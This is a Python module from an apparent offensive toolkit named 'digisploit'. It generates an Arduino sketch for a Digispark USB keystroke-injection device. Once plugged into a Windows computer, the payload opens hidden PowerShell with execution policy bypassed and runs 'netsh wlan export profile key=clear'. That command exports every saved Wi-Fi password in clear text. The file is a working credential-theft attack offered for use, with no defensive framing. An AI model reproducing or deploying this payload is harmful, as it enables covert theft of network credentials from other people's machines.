import os, sys, time
from colorama import Fore


def wifi_grabber():
    script_ino = '''
#include "DigiKeyboard.h"

char modo[] = "powershell -nop -win h -noni -exec bypass";
char sair[] = "exit";

void setup() {

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println(modo);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("md wifi_grabber");
  DigiKeyboard.println("cd wifi_grabber");
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.println("exit");
  for(;;){ /*empty*/ }
}'''

    print(f'\n{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} 1st Step: Create wifi_grabber.ino\n')

    confirm = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/wifi/grabber){Fore.LIGHTWHITE_EX} Do you want to create the script? Y/[N]: ')

    while True:
      if confirm == 'y':
        print(f'\n{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Finished! Results in "constructions/wifi_grabber"')
        time.sleep(3)

        result = open('constructions/wifi_grabber/wifi_grabber.ino', 'w')
        result.write(script_ino)
        break

      if confirm == 'Y':
        print(f'\n{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Finished! Results in "constructions/wifi_grabber"')
        time.sleep(5)

        result = open('constructions/wifi_grabber/wifi_grabber.ino', 'w')
        result.write(script_ino)
        break

      if confirm == 'n':
        break

      if confirm == 'N':
        break